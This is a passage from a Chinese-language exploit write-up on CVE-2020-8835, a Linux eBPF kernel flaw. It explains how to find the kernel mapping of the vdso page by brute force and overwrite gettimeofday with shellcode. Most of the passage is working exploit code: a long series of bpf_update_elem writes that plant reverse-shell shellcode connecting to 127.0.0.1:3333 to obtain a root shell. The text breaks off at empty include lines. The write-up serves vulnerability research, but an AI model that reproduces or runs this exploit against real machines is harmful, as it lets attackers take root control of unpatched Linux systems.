### 前言
看到两位大佬关于CVE-2020-8835的漏洞分析利用  
这两篇文章分别通过修改modprobe_path的值和通过init_pid_ns结构查找cred结构进而修改的方式进行提权,本文对漏洞利用进行新的尝试,通过任意读写漏洞,分别做到劫持vdso提权,
劫持prctl到`__orderly_poweroff`进行提权和根据comm查找cred结构体提权,其完整的代码和漏洞环境在文末给出
### 劫持vdso提权
关于vdso的个人直白理解:一个物理页大小的空间,分别映射在了用户空间和内核空间,如图所示  
其结构为elf格式,里边分别有5个系统调用,
vdso所在的页，在内核态是可读、可写的，在用户态是可读、可执行的。我们可以通过这个特点,在内核空间对vdso进行修改,这样用户在用户态调用vdso的函数进行劫持
在用户态下查看用户空间的vdso地址
    root@snappyjackPC:~# more /proc/self/maps | grep vdso
    7ffe700c4000-7ffe700c5000 r-xp 00000000 00:00 0                          [vdso]
而对于vdso在内核空间的位置,我们可以通过特殊字段的识别,如”gettimeofday”字段,首先我们找到该字段对于elf文件的偏移  
该程序读取用户空间vdso,并找到相对于gettimeofday的偏移,运行结果如下
    / $ ./dumpmorty 
    [+]VDSO : 0x7fffc1bc6000
    [+]The offset of gettimeofday is : 2f8
在寻找内核空间vdso映射的地址,我们采用爆破的方法,其中vdso所在的位置范围为0xffff880000000000~0xffffc80000000000,并且vdso占用大小为一个完整物理页,我们可以在爆破范围内地址依次增加0x1000,并且加上字符串的偏移0x2f8,与”
gettimeofday”进行对比,从而找到vdso在内核空间的映射  
一旦我们确定了vdso地址,我们通过gdb对vdso进行dump`dump memory /home/dumpelf2 0xffffffff822c0000
0xffffffff822c1000`,并通过ida查看其函数地址偏移  
通过vdso地址和函数偏移,我们可以很容易得到函数在内核空间的地址.通过劫持gettimeofday函数,将其功能改为一段反弹shell的代码,另一个进程进行接收具有root权限的shell,从而完成提权.
其中shellcode从这里提供  
该shell代码向地址127.0.0.1:3333进行反弹shell.
将该汇编代码转换为shellcode,通过任意地址的4个字节的修改,添加到我们的程序中,如下
    exp_buf[0] = 0x31485390-1;
    bpf_update_elem(0, exp_buf, exp_mapfd, vdso_addr+0x730+0x4*0);//0xffffffff822c0730
    exp_buf[0] = 0x0f66b0c0-1;
    bpf_update_elem(0, exp_buf, exp_mapfd, vdso_addr+0x730+0x4*1);
    exp_buf[0] = 0xdb314805-1;
    bpf_update_elem(0, exp_buf, exp_mapfd, vdso_addr+0x730+0x4*2);
    exp_buf[0] = 0x75c33948-1;
    bpf_update_elem(0, exp_buf, exp_mapfd, vdso_addr+0x730+0x4*3);
    exp_buf[0] = 0xc031480f-1;
    bpf_update_elem(0, exp_buf, exp_mapfd, vdso_addr+0x730+0x4*4);
    exp_buf[0] = 0x050f39b0-1;
    bpf_update_elem(0, exp_buf, exp_mapfd, vdso_addr+0x730+0x4*5);
    exp_buf[0] = 0x48db3148-1;
    bpf_update_elem(0, exp_buf, exp_mapfd, vdso_addr+0x730+0x4*6);
    exp_buf[0] = 0x0974d839-1;
    bpf_update_elem(0, exp_buf, exp_mapfd, vdso_addr+0x730+0x4*7);
    exp_buf[0] = 0xc031485b-1;
    bpf_update_elem(0, exp_buf, exp_mapfd, vdso_addr+0x730+0x4*8);
    exp_buf[0] = 0x050f60b0-1;
    bpf_update_elem(0, exp_buf, exp_mapfd, vdso_addr+0x730+0x4*9);
    exp_buf[0] = 0xd23148c3-1;
    bpf_update_elem(0, exp_buf, exp_mapfd, vdso_addr+0x730+0x4*10);
    exp_buf[0] = 0x6a5e016a-1;
    bpf_update_elem(0, exp_buf, exp_mapfd, vdso_addr+0x730+0x4*11);
    exp_buf[0] = 0x296a5f02-1;
    bpf_update_elem(0, exp_buf, exp_mapfd, vdso_addr+0x730+0x4*12);
    exp_buf[0] = 0x48050f58-1;
    bpf_update_elem(0, exp_buf, exp_mapfd, vdso_addr+0x730+0x4*13);
    exp_buf[0] = 0xb9485097-1;
    bpf_update_elem(0, exp_buf, exp_mapfd, vdso_addr+0x730+0x4*14);
    exp_buf[0] = 0xfaf2fffd-1;
    bpf_update_elem(0, exp_buf, exp_mapfd, vdso_addr+0x730+0x4*15);
    exp_buf[0] = 0xfeffff80-1;
    bpf_update_elem(0, exp_buf, exp_mapfd, vdso_addr+0x730+0x4*16);
    exp_buf[0] = 0x51d1f748-1;
    bpf_update_elem(0, exp_buf, exp_mapfd, vdso_addr+0x730+0x4*17);
    exp_buf[0] = 0x6ae68948-1;
    bpf_update_elem(0, exp_buf, exp_mapfd, vdso_addr+0x730+0x4*18);
    exp_buf[0] = 0x2a6a5a10-1;
    bpf_update_elem(0, exp_buf, exp_mapfd, vdso_addr+0x730+0x4*19);
    exp_buf[0] = 0x48050f58-1;
    bpf_update_elem(0, exp_buf, exp_mapfd, vdso_addr+0x730+0x4*20);
    exp_buf[0] = 0x3948db31-1;
    bpf_update_elem(0, exp_buf, exp_mapfd, vdso_addr+0x730+0x4*21);
    exp_buf[0] = 0x480774d8-1;
    bpf_update_elem(0, exp_buf, exp_mapfd, vdso_addr+0x730+0x4*22);
    exp_buf[0] = 0xe7b0c031-1;
    bpf_update_elem(0, exp_buf, exp_mapfd, vdso_addr+0x730+0x4*23);
    exp_buf[0] = 0x6a90050f-1;
    bpf_update_elem(0, exp_buf, exp_mapfd, vdso_addr+0x730+0x4*24);
    exp_buf[0] = 0x216a5e03-1;
    bpf_update_elem(0, exp_buf, exp_mapfd, vdso_addr+0x730+0x4*25);
    exp_buf[0] = 0xceff4858-1;
    bpf_update_elem(0, exp_buf, exp_mapfd, vdso_addr+0x730+0x4*26);
    exp_buf[0] = 0xf675050f-1;
    bpf_update_elem(0, exp_buf, exp_mapfd, vdso_addr+0x730+0x4*27);
    exp_buf[0] = 0x50c03148-1;
    bpf_update_elem(0, exp_buf, exp_mapfd, vdso_addr+0x730+0x4*28);
    exp_buf[0] = 0x9dd0bb48-1;
    bpf_update_elem(0, exp_buf, exp_mapfd, vdso_addr+0x730+0x4*29);
    exp_buf[0] = 0x8cd09196-1;
    bpf_update_elem(0, exp_buf, exp_mapfd, vdso_addr+0x730+0x4*30);
    exp_buf[0] = 0xf748ff97-1;
    bpf_update_elem(0, exp_buf, exp_mapfd, vdso_addr+0x730+0x4*31);
    exp_buf[0] = 0x894853d3-1;
    bpf_update_elem(0, exp_buf, exp_mapfd, vdso_addr+0x730+0x4*32);
    exp_buf[0] = 0x485750e7-1;
    bpf_update_elem(0, exp_buf, exp_mapfd, vdso_addr+0x730+0x4*33);
    exp_buf[0] = 0x3148e689-1;
    bpf_update_elem(0, exp_buf, exp_mapfd, vdso_addr+0x730+0x4*34);
    exp_buf[0] = 0x0f3bb0d2-1;
    bpf_update_elem(0, exp_buf, exp_mapfd, vdso_addr+0x730+0x4*35);
    exp_buf[0] = 0xc0314805-1;
    bpf_update_elem(0, exp_buf, exp_mapfd, vdso_addr+0x730+0x4*36);
    exp_buf[0] = 0x050fe7b0-1;
    bpf_update_elem(0, exp_buf, exp_mapfd, vdso_addr+0x730+0x4*37);
为了验证是否劫持了用户空间的gettimeofday,我们采用如下程序打印用户空间的vdso中的gettimeofday函数的代码
    #include 
    #include 
    #include 
    #include 
    #include 